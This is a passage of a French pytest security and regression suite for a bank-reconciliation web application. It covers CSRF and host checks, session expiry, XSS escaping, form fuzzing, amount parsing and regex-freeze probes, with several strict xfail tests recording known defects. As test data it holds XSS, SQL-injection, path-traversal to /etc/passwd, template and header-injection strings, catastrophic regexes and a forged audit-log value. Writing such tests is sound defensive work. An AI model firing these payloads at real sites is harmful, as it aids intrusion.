    cle = __import__("rapprochement.web.application", fromlist=["cle_entree"]).cle_entree(d.message_id, d.empreinte)
    statut, _, _ = bob.action("/non-rattaches/confirmer", {"cle": cle, "forcer": "oui", "motif": "x",
                                                           "dossier": "BETA", "reference": "B-001"}, page="/non-rattaches")
    assert statut == 403
    assert (etat_brut(inst), inst.audit.read_bytes()) == avant


def test_sain_web_csrf_origine_hote_et_session(web) -> None:
    inst, app = web
    alice = _ClientWeb(app)
    alice.connecter("alice")
    jeton = alice.csrf("/")
    avant = (etat_brut(inst), inst.audit.read_bytes())
    chemin = "/audit/exporter"
    assert alice.requete("POST", chemin, {})[0] == 403                                   # sans jeton
    assert alice.requete("POST", chemin, {"csrf": "faux" * 10})[0] == 403
    assert alice.requete("POST", chemin, {"csrf": jeton}, entetes={"Origin": "http://evil.example"})[0] == 403
    assert alice.requete("POST", chemin, {"csrf": jeton}, entetes={"Sec-Fetch-Site": "cross-site"})[0] == 403
    assert alice.requete("GET", "/", entetes={"Host": "evil.example"})[0] == 400          # rebinding DNS
    pirate = _ClientWeb(app, hote="evil.example")
    assert pirate.requete("GET", "/connexion")[0] == 400
    assert alice.requete("PUT", "/", {})[0] == 405 and alice.requete("DELETE", "/")[0] == 405
    assert alice.requete("GET", chemin)[0] in (404, 405)                                  # un GET n'ecrit jamais
    autre = _ClientWeb(app)                                                               # jeton d'une AUTRE session
    autre.connecter("bob")
    assert alice.requete("POST", chemin, {"csrf": autre.csrf("/")})[0] == 403
    assert not (inst.racine / "exports").exists() or not list((inst.racine / "exports").glob("*.json"))
    assert (etat_brut(inst), inst.audit.read_bytes()) == avant


def test_sain_web_session_detruite_a_la_deconnexion_et_au_changement_de_mot_de_passe(web) -> None:
    inst, app = web
    c = _ClientWeb(app)
    c.connecter("bob")
    jeton_cookie = c.cookies["session"]
    assert c.requete("GET", "/")[0] == 200
    _comptes.changer_mot_de_passe(inst, "bob", "un-autre-motdepasse-2")
    assert c.requete("GET", "/")[0] == 303                                                # session morte
    rejoue = _ClientWeb(app)
    rejoue.cookies["session"] = jeton_cookie
    assert rejoue.requete("GET", "/")[0] == 303
    d = _ClientWeb(app)
    d.connecter("alice")
    ancien = d.cookies["session"]
    d.action("/deconnexion")
    rejoue2 = _ClientWeb(app)
    rejoue2.cookies["session"] = ancien
    assert rejoue2.requete("GET", "/")[0] == 303


XSS_WEB = "<script>alert(9)</script>"


def test_sain_web_xss_config_dossiers_et_contexte_de_la_file(web) -> None:
    inst, app = web
    alice = _ClientWeb(app)
    alice.connecter("alice")
    for config in (_json.dumps({"mode_test": XSS_WEB}), _json.dumps({"mode_test": False, "adresse_test": XSS_WEB}),
                   '{"mode_test": "' + XSS_WEB):
        inst.config.write_text(config, encoding="utf-8")
        for chemin in ROUTES_ECRAN:
            statut, _, texte = alice.requete("GET", chemin)
            assert statut == 200 and "<script>alert(9)" not in texte, (chemin, config)
    inst.config.unlink()
    entree = inst.racine.parent / "entree_hostile"
    entree.mkdir()
    (entree / "dossiers.csv").write_text(f"dossier,raison_sociale,email_contact,circuit\n{XSS_WEB},A,a@a.fr,C-{XSS_WEB}\n", encoding="utf-8")
    app.entree = entree
    [b] = [x for x in cycle.brouillons(inst) if x.destinataire == "compta@alpha-sarl.fr"]
    statut, _, texte = alice.requete("GET", f"/brouillons/{b.id_relance}")
    assert statut == 200 and "<script>alert(9)" not in texte and "refus" in texte.lower()
    # Expediteur, objet et nom de fichier hostiles venus d'un e-mail, puis les pages qui les affichent.
    (inst.entrant / "3.eml").write_bytes(eml(f"{XSS_WEB}@evil.example", "<m3@x>", objet=f"{XSS_WEB} {{{{7*7}}}}",
                                             fichiers=((f'"><img src=x onerror=alert(1)>.pdf', b"%PDF C"),)))
    lancer(inst.racine.parent / "e", inst, J0)
    for chemin in ("/non-rattaches", "/", "/audit"):
        statut, _, texte = alice.requete("GET", chemin)
        assert statut == 200 and "<script>alert" not in texte and "<img src=x" not in texte, chemin


@pytest.mark.parametrize("cle", ["é", "‮", "a" * 10 + "é"])
def test_regression_web_cle_non_ascii_provoque_une_erreur_500(web, cle) -> None:
    inst, app = web
    bob = _ClientWeb(app)
    bob.connecter("bob")
    statut, _, _ = bob.action("/non-rattaches/confirmer", {"cle": cle}, page="/non-rattaches")
    assert statut < 500


def test_regression_web_bandeau_donnees_fictives_sur_une_instance_reelle(web) -> None:
    inst, app = web
    assert cycle.mode_instance(inst) == "reel"
    inst.config.write_text('{"mode_test": true}', encoding="utf-8")
    alice = _ClientWeb(app)
    alice.connecter("alice")
    _, _, texte = alice.requete("GET", "/")
    assert "Instance : mode réel" in texte
    assert "DONNEES FICTIVES" not in texte


def test_sain_web_bandeau_mode_test_fige_reste_meme_sans_config(tmp_path, _modele_comptes_web) -> None:
    entree, inst, _ = _brouillon_valide(tmp_path, mode_test=True)
    for nom in ("utilisateurs.json", "validateurs.txt", "responsables.txt"):
        _shutil.copy(_modele_comptes_web / nom, inst.racine / nom)
    inst.config.unlink()
    app = _Application(inst, horloge=lambda: dt.datetime(2026, 10, 5, 10, 0, tzinfo=_PARIS))
    try:
        c = _ClientWeb(app)
        c.connecter("alice")
        _, _, texte = c.requete("GET", "/")
        assert "MODE TEST" in texte and "Instance : mode test" in texte and "config.json" in texte
    finally:
        app.fermer()


def test_sain_web_fuzz_des_formulaires_jamais_de_500(web) -> None:
    import random
    from urllib.parse import quote
    inst, app = web
    alice = _ClientWeb(app)
    alice.connecter("alice")
    jeton = alice.csrf("/")
    charges = ["", " ", "\x00", "a" * 600, "%00", "' OR 1=1 --", "../../etc/passwd", "{{7*7}}", "{x}", "%s%s", XSS_WEB,
               "‮", "2026-13-45", "-1", "NaN", "9" * 400, "\r\nSet-Cookie: x=1", "ALPHA", "A-001", "B-001", "oui"]
    champs = ["dossier", "reference", "motif", "decision", "date", "parti", "forcer", "confirmation", "retour", "f_dossier"]
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    routes = ["/pieces/controler", "/pieces/promesse", "/pieces/bloquer", "/pieces/debloquer", "/pieces/arbitrer",
              f"/brouillons/{b.id_relance}/valider", f"/brouillons/{b.id_relance}/rejeter",
              f"/brouillons/{b.id_relance}/trancher", f"/brouillons/{b.id_relance}/envoyer", "/audit/exporter",
              "/audit/reparer"]
    hasard = random.Random(5)
    for route in routes:
        for _ in range(25):
            donnees = {"csrf": jeton, **{c: hasard.choice(charges) for c in hasard.sample(champs, hasard.randint(0, 4))}}
            corps = "&".join(f"{k}={quote(v, safe='')}" for k, v in donnees.items())
            environ_corps = corps.encode("ascii")
            environ = {"REQUEST_METHOD": "POST", "SCRIPT_NAME": "", "PATH_INFO": route, "QUERY_STRING": "",
                       "HTTP_HOST": "127.0.0.1:8000", "REMOTE_ADDR": "127.0.0.1", "wsgi.input": _io.BytesIO(environ_corps),
                       "CONTENT_LENGTH": str(len(environ_corps)), "CONTENT_TYPE": "application/x-www-form-urlencoded",
                       "HTTP_COOKIE": "; ".join(f"{k}={v}" for k, v in alice.cookies.items())}
            _setup_wsgi(environ)
            recu = {}
            texte = b"".join(app(environ, lambda s, h, e=None: recu.update(statut=s))).decode("utf-8")
            assert int(recu["statut"].split()[0]) < 500, (route, donnees)
            assert "Traceback" not in texte and "<script>alert" not in texte
    # Le fuzz n'a jamais casse l'integrite du journal.
    assert cycle.verifier_audit(inst).ok


# --- Performance du controle des envois ----------------------------------------------------------


def test_regression_controler_envois_quadratique(tmp_path) -> None:
    from rapprochement.audit import HASH_INITIAL, _calculer_hash, _canonique
    inst = nouvelle_instance(tmp_path / "i")
    precedent, seq, lignes = HASH_INITIAL, 0, []

    def ajouter(acteur, action, objet, details):
        nonlocal precedent, seq
        seq += 1
        c = {"seq": seq, "horodatage": "2026-10-05T10:00:00+02:00", "acteur": acteur, "action": action,
             "objet": objet, "details": details, "hash_precedent": precedent}
        precedent = c["hash"] = _calculer_hash(c)
        lignes.append((_canonique(c) + "\n").encode("ascii"))

    for i in range(60_000):
        ajouter("systeme", "piece_creee", f"D/R{i}", {"x": i})
    for i in range(3_000):
        ajouter(VALIDEUSE, "valide", f"B{i}", {"par": VALIDEUSE, "destinataire": f"d{i}@x.fr", "niveau": 1})
        ajouter("systeme", "envoi_effectue", f"B{i}", {"valide_par": VALIDEUSE, "destinataire": f"d{i}@x.fr",
                                                       "envoye_par": VALIDEUSE})
    inst.audit.write_bytes(b"".join(lignes))
    t = time.perf_counter()
    cycle.controler_envois(inst)
    assert time.perf_counter() - t < 5


# ===========================================================================
# 12. Sixieme passage : controle du mode, adresse_test, en-tetes normalises,
#     montants limites, sonde de regex
# ===========================================================================

from rapprochement import exclusions as _exclusions  # noqa: E402
from rapprochement.parseurs import lire_montant  # noqa: E402

# --- Montants : formats limites ---------------------------------------------------------------


@pytest.mark.parametrize("texte, attendu", [
    ("+12", "12"), (".5", "0.5"), ("5.", "5"), ("-.5", "-0.5"), ("+.5", "0.5"), ("  12,50  ", "12.50"),
    ("1.234.567,89", "1234567.89"), ("1,234,567.89", "1234567.89"), ("(12,50)", "-12.50"), ("0", "0"),
    ("12,50 EUR", "12.50"), ("EUR 12,50", "12.50"), ("12.50€", "12.50"), ("1 234,56", "1234.56"),
])
def test_sain_montants_formats_limites_bien_lus(texte, attendu) -> None:
    assert lire_montant(texte) == Decimal(attendu)


@pytest.mark.parametrize("texte", [".", "+", "-", "--5", "1,234,56", "12.50.", "1E5", "1e-2", "0x10", "12,5e1", "1_000",
                                   "NaN", "Infinity", "-inf", "1'234", "1 234,56", "12,50-", "1.234,56,7"])
def test_sain_montants_formes_illisibles_refusees(texte) -> None:
    with pytest.raises(ErreurFormat):
        lire_montant(texte)


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Montants : `EUR` et `€` sont retires N'IMPORTE OU dans la chaine : `12€50` (ecriture usuelle de "
    "12,50 EUR) est lu 1250, `12 EUR 50` aussi, `1EUR2` donne 12. Un montant multiplie par 100 sans "
    "erreur : la piece ne correspond plus, un autre paiement peut etre justifie a tort."))
@pytest.mark.parametrize("texte, interdit", [("12€50", "1250"), ("12 EUR 50", "1250"), ("1EUR2", "12")])
def test_defaut_montant_symbole_devise_au_milieu(texte, interdit) -> None:
    try:
        valeur = lire_montant(texte)
    except ErreurFormat:
        return
    assert valeur != Decimal(interdit)


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Montants : `1,234` et `1.234` (trois decimales) sont lus 1,234 EUR alors que, selon la banque, "
    "ils designent 1 234 EUR ; `12.345` est accepte tel quel. Une monnaie a deux decimales : un "
    "montant a trois decimales est ambigu et doit etre refuse, pas devine."))
@pytest.mark.parametrize("texte", ["1,234", "1.234", "12.345", "0,125"])
def test_defaut_montant_a_trois_decimales_devine(texte) -> None:
    try:
        valeur = lire_montant(texte)
    except ErreurFormat:
        return
    assert valeur.as_tuple().exponent >= -2


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Montants : une parenthese non appariee (`(12,50`, `12,50)`) est retiree sans regard et le "
    "montant est lu POSITIF ; `(-12,50)` (double negation) est lu +12,50. Le sens d'un montant "
    "(paiement ou remboursement) est devine de travers sans erreur."))
@pytest.mark.parametrize("texte", ["(12,50", "12,50)", "(-12,50)"])
def test_defaut_montant_parentheses_mal_appariees(texte) -> None:
    try:
        lire_montant(texte)
    except ErreurFormat:
        return
    raise AssertionError("refus attendu")


# --- En-tetes normalises : deux colonnes qui se normalisent identiquement --------------------------


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Lecteurs : `Débit` et `debit` (ou `Dossier` et `dossier`, `Circuit` et `circuit`...) se "
    "normalisent en une seule cle : la DERNIERE colonne ecrase la premiere en silence (releve : un "
    "debit de 120,00 devient 0 et la ligne est sautee ; dossiers : C-RELAIS devient C-DIRECT). "
    "Seul `exclusions_dossier.csv` refuse les colonnes en double."))
@pytest.mark.parametrize("lecteur, contenu", [
    ("releve", "dossier,date_operation,libelle,Débit,debit,credit,reference\nA,2026-09-03,CB X,120.00,,,R1\n"),
    ("releve", "dossier,Dossier,date_operation,libelle,debit,credit,reference\nALPHA,BETA,2026-09-03,CB X,120.00,,R1\n"),
    ("releve", "dossier,date_operation,libelle,Libellé,debit,credit,reference\nA,2026-09-03,CB X,AUTRE,120.00,,R1\n"),
    ("pieces", "id_piece,dossier,fichier,fournisseur,date_facture,montant_ttc,Montant_TTC\nP1,A,f,X,2026-09-02,12.50,99.00\n"),
    ("dossiers", "dossier,raison_sociale,email_contact,circuit,Circuit,email_relais\nA,Alpha,a@a.fr,C-RELAIS,C-DIRECT,p@c.fr\n"),
])
def test_defaut_entetes_en_double_apres_normalisation(tmp_path, lecteur, contenu) -> None:
    chemin = tmp_path / "x.csv"
    chemin.write_text(contenu, encoding="utf-8")
    try:
        {"releve": lire_releve, "pieces": lire_pieces,
         "dossiers": lambda c: lire_dossiers(c, circuit_obligatoire=True)}[lecteur](chemin)
    except ErreurFormat:
        return
    raise AssertionError("colonnes en double acceptees")


def test_sain_exclusions_colonnes_en_double_refusees(tmp_path) -> None:
    chemin = tmp_path / "x.csv"
    chemin.write_text("dossier,motif_regex,statut,Statut\nA,loxam,proposee,validee\n", encoding="utf-8")
    with pytest.raises(ErreurFormat, match="double"):
        Referentiel.depuis_csv(chemin)


# --- Controle du mode figé : base / journal -------------------------------------------------------


def _verif(commande: str, inst: cycle.Instance) -> int:
    with _contextlib.redirect_stdout(_io.StringIO()), _contextlib.redirect_stderr(_io.StringIO()):
        return charger_cli().main([commande, "--instance", str(inst.racine)])


@pytest.mark.parametrize("mode_test", [False, True])
def test_sain_controler_mode_instance_saine(tmp_path, mode_test) -> None:
    entree, inst, _ = _brouillon_valide(tmp_path, mode_test=mode_test)
    assert cycle.controler_mode(inst) == ()
    assert _verif("verifier-audit", inst) == 0 and _verif("controler-envois", inst) == 0


def test_sain_controler_mode_incoherences_sortent_non_nul(tmp_path) -> None:
    # Marqueur de la base supprime : signale tant que le cycle ne l'a pas retabli.
    entree, inst, _ = _brouillon_valide(tmp_path / "a")
    _supprimer_marqueurs(inst)
    assert cycle.controler_mode(inst) and _verif("verifier-audit", inst) == 1 and _verif("controler-envois", inst) == 1
    # Deux marqueurs dans la base.
    entree, inst, _ = _brouillon_valide(tmp_path / "b")
    with Depot(inst.depot) as d:
        d.marquer_vu(cycle.CLE_MODE_INSTANCE + "test")
    assert cycle.controler_mode(inst) and _verif("verifier-audit", inst) == 1
    # Entree `mode_instance` forgee (correctement chainee) pour l'autre mode : fail ferme.
    entree, inst, _ = _brouillon_valide(tmp_path / "c")
    _Journal(inst.audit).ecrire("systeme", "mode_instance", "2026-10-05", {"mode": "test"}, horodatage=a(J0))
    assert cycle.controler_mode(inst) and _verif("verifier-audit", inst) == 1
    with pytest.raises(cycle.ModeInstanceIncompatible):
        lancer(entree, inst, J0 + dt.timedelta(days=1))
    # Entree `mode_instance` absente du journal (journal tronque proprement) alors que la base la connait.
    entree, inst, _ = _brouillon_valide(tmp_path / "d")
    lignes = inst.audit.read_bytes().split(b"\n")
    inst.audit.write_bytes(b"\n".join(l for l in lignes if b'"action":"mode_instance"' not in l))
    assert cycle.controler_mode(inst)


def test_sain_controler_mode_texte_hostile_dans_une_valeur_du_journal(tmp_path) -> None:
    """Un Message-ID choisi par l'expediteur ne fabrique pas une entree `mode_instance`."""
    entree = ecrire_entree(tmp_path / "e")
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    (inst.entrant / "h.eml").write_bytes(eml("x@evil.example", '<"action":"mode_instance","details":{"mode":"test"}>',
                                             fichiers=(("f.pdf", b"%"),)))
    lancer(entree, inst, J0)
    assert cycle.controler_mode(inst) == () and cycle.mode_instance(inst) == "reel"


def test_defaut_base_recreee_guerie_en_silence_double_envoi(tmp_path) -> None:
    entree, inst, b = _brouillon_valide(tmp_path)
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0), par=VALIDEUSE)
    for chemin in tmp_path.glob("i/depot.sqlite*"):
        chemin.unlink()
    j1 = J0 + dt.timedelta(days=1)
    try:
        lancer(entree, inst, j1)
        [b2] = [x for x in cycle.brouillons(inst) if x.destinataire == "compta@alpha-sarl.fr"]
        cycle.valider_relance(inst, b2.id_relance, VALIDEUSE, maintenant=a(j1))
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a(j1), par=VALIDEUSE)
    except (cycle.ErreurCycle, envoi.EnvoiNonValide):
        return                                                       # refus : acceptable
    assert len(list(inst.outbox.glob("*.eml"))) == 1


def test_sain_mode_instance_journal_volumineux_reste_rapide(tmp_path) -> None:
    from rapprochement.audit import HASH_INITIAL, _calculer_hash, _canonique
    inst = nouvelle_instance(tmp_path / "i")
    precedent, lignes = HASH_INITIAL, []
    for seq in range(1, 60_001):
        c = {"seq": seq, "horodatage": "2026-10-05T10:00:00+02:00", "acteur": "systeme", "action": "piece_creee",
             "objet": f"D/R{seq}", "details": {"x": seq}, "hash_precedent": precedent}
        precedent = c["hash"] = _calculer_hash(c)
        lignes.append((_canonique(c) + "\n").encode("ascii"))
    inst.audit.write_bytes(b"".join(lignes))
    t = time.perf_counter()
    cycle.mode_instance(inst)
    cycle.controler_mode(inst)
    assert time.perf_counter() - t < 2


# --- adresse_test ------------------------------------------------------------------------------------------


def _dossiers_adresse_test():
    from rapprochement.modeles import Dossier
    return {
        "A": Dossier("A", "Alpha", "Compta Alpha <Compta@Alpha-Sarl.FR>", "M", circuit="C-DIRECT", domaines=("alpha-sarl.fr",)),
        "B": Dossier("B", "Beta", "gerant@gmail.com", "M", circuit="C-RELAIS", email_relais="pieces@cabinet-relais.fr"),
        "C": Dossier("C", "Gamma", "x@sous.gamma.fr; y@gamma.fr", "M", circuit="C-DIRECT", domaines=("gamma.fr",)),
        "D": Dossier("D", "Delta", "contact@société.fr", "M", circuit="C-DIRECT"),
    }


@pytest.mark.parametrize("adresse", [
    "compta@alpha-sarl.fr", "COMPTA@ALPHA-SARL.FR", " compta@alpha-sarl.fr ", "compta+test@alpha-sarl.fr",
    "autre@alpha-sarl.fr", "test@cabinet-relais.fr", "gerant@gmail.com", "Gerant@GMAIL.COM", "a@sous.gamma.fr",
    "z@gamma.fr", "contact@société.fr",
])
def test_sain_adresse_test_adresses_et_domaines_de_clients_refuses(adresse) -> None:
    with pytest.raises(cycle.ConfigInvalide):
        cycle.verifier_adresse_test(adresse, _dossiers_adresse_test())


@pytest.mark.parametrize("adresse", ["test@exemple.invalid", "test@gmail.com", "moi@cabinet-interne.fr", "a@autre.example"])
def test_sain_adresse_test_adresses_sans_client_acceptees(adresse) -> None:
    cycle.verifier_adresse_test(adresse, _dossiers_adresse_test())


@pytest.mark.parametrize("adresse", ["autre@ALPHA-SARL.FR.", "autre@mail.alpha-sarl.fr", "autre@xn--socit-esab.fr",
                                     "autre@deep.sous.gamma.fr"])
def test_defaut_adresse_test_variantes_de_domaine_d_un_client(adresse) -> None:
    try:
        cycle.verifier_adresse_test(adresse, _dossiers_adresse_test())
    except cycle.ConfigInvalide:
        return
    raise AssertionError("refus attendu")


@pytest.mark.parametrize("adresse", ["gerant+test@gmail.com", "ge.rant@gmail.com", "gerant@googlemail.com"])
def test_defaut_adresse_test_meme_boite_grand_public(adresse) -> None:
    try:
        cycle.verifier_adresse_test(adresse, _dossiers_adresse_test())
    except cycle.ConfigInvalide:
        return
    raise AssertionError("refus attendu")


# --- Sonde de regex -----------------------------------------------------------------------------------------


def _fichier_regles(chemin: Path, regles, statut: str = "validee") -> Path:
    return _csv_exclusions(chemin, [[f"D{i % 20:02d}", r, "m", f"r{i}", "Paul", "2026-10-01", statut]
                                    for i, r in enumerate(regles)])


def test_sain_sonde_regex_regles_saines_et_catastrophiques(tmp_path) -> None:
    t = time.perf_counter()
    Referentiel.depuis_csv(_fichier_regles(tmp_path / "a.csv", [f"loxam{i}.*pro" for i in range(1000)]))
    assert time.perf_counter() - t < 2                                # regles « sures » : aucune sonde
    Referentiel.depuis_csv(_fichier_regles(tmp_path / "b.csv", ["(loxam|hilti)+ pro", "(orange|sfr){1,3}x"]))
    for regle in ("(a|aa)+$", "(a+)+$", "(.|.)+x"):
        with pytest.raises(ErreurFormat, match="ligne 2"):
            Referentiel.depuis_csv(_fichier_regles(tmp_path / "c.csv", [regle]))
    # Une regle PROPOSEE est sondee comme une regle validee (jamais executee ensuite).
    with pytest.raises(ErreurFormat):
        Referentiel.depuis_csv(_fichier_regles(tmp_path / "d.csv", ["(a|aa)+$"], statut="proposee"))


def test_sain_sonde_regex_deux_lectures_concurrentes(tmp_path) -> None:
    fichier = _fichier_regles(tmp_path / "x.csv", ["(loxam|hilti)+ pro"] * 5 + ["(a|aa)+$"])
    resultats: list[str] = []
    depart = threading.Barrier(4)

    def lire() -> None:
        depart.wait()
        try:
            Referentiel.depuis_csv(fichier)
            resultats.append("accepte")
        except ErreurFormat:
            resultats.append("refuse")

    fils = [threading.Thread(target=lire) for _ in range(4)]
    for f in fils:
        f.start()
    for f in fils:
        f.join()
    assert resultats == ["refuse"] * 4


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Sonde de regex : chaque regle « a sonder » (`(loxam|hilti)+ pro`, alternative quantifiee, "
    "tout a fait saine) lance son PROPRE interpreteur (~21 ms) a chaque lecture du fichier, donc a "
    "chaque cycle : 100 regles = 2 s, 1 000 regles = 21 s avant la moindre ecriture. `_sonder` "
    "accepte pourtant une liste ; aucun regroupement ni cache."))
def test_defaut_sonde_regex_cout_lineaire_en_processus(tmp_path) -> None:
    fichier = _fichier_regles(tmp_path / "x.csv", [f"(loxam{i}|hilti{i})+ ?pro" for i in range(300)])
    t = time.perf_counter()
    Referentiel.depuis_csv(fichier)
    assert time.perf_counter() - t < 3


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Sonde de regex : si le processus de sondage ne peut pas demarrer (`sys.executable` vide ou "
    "introuvable, limite de processus, executable fige) ou plante, `_sonder` renvoie None = « ne "
    "gele pas » : `(a|aa)+$` est ACCEPTEE. Le garde-fou echoue OUVERT ; il devrait echouer ferme."))
@pytest.mark.parametrize("executable", ["", "/nonexistent/python"])
def test_defaut_sonde_regex_echoue_ouvert(tmp_path, monkeypatch, executable) -> None:
    monkeypatch.setattr(sys, "executable", executable)
    try:
        Referentiel.depuis_csv(_fichier_regles(tmp_path / "x.csv", ["(a|aa)+$"]))
    except ErreurFormat:
        return
    raise AssertionError("expression catastrophique acceptee sans sonde")


@pytest.mark.xfail(strict=True, raises=AssertionError, reason=(
    "Garde-fou de regex : des repetitions SUCCESSIVES non imbriquees (`.*.*.*.*.*.*.*.*.*.*x`, "
    "`\\w+\\w+\\w+\\w+\\w+\\w+\\w+\\w+x`, `a*a*a*a*a*a*a*a*a*a*b`) sont classees « sures », "
    "non sondees, et gelent le cycle de tous les dossiers (temps polynomial de degre eleve) sur un "
    "libelle de 60 caracteres."))
@pytest.mark.parametrize("regle", [".*.*.*.*.*.*.*.*.*.*x", "\\w+\\w+\\w+\\w+\\w+\\w+\\w+\\w+x", "a*a*a*a*a*a*a*a*a*a*b"])
def test_defaut_regex_repetitions_successives_gelent_le_cycle(tmp_path, regle) -> None:
    chemin = _fichier_regles(tmp_path / "x.csv", [regle])
    script = (_SCRIPT_REGEX.replace("'a' * 30 + 'b'", "'a' * 60").replace("ALPHA", "D00")
              .format(src=str(RACINE / "src"), csv=str(chemin)))
    try:
        sortie = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=6)
    except subprocess.TimeoutExpired:
        raise AssertionError("cycle gele > 6 s") from None
    assert sortie.returncode == 0 or "ErreurFormat" in sortie.stderr
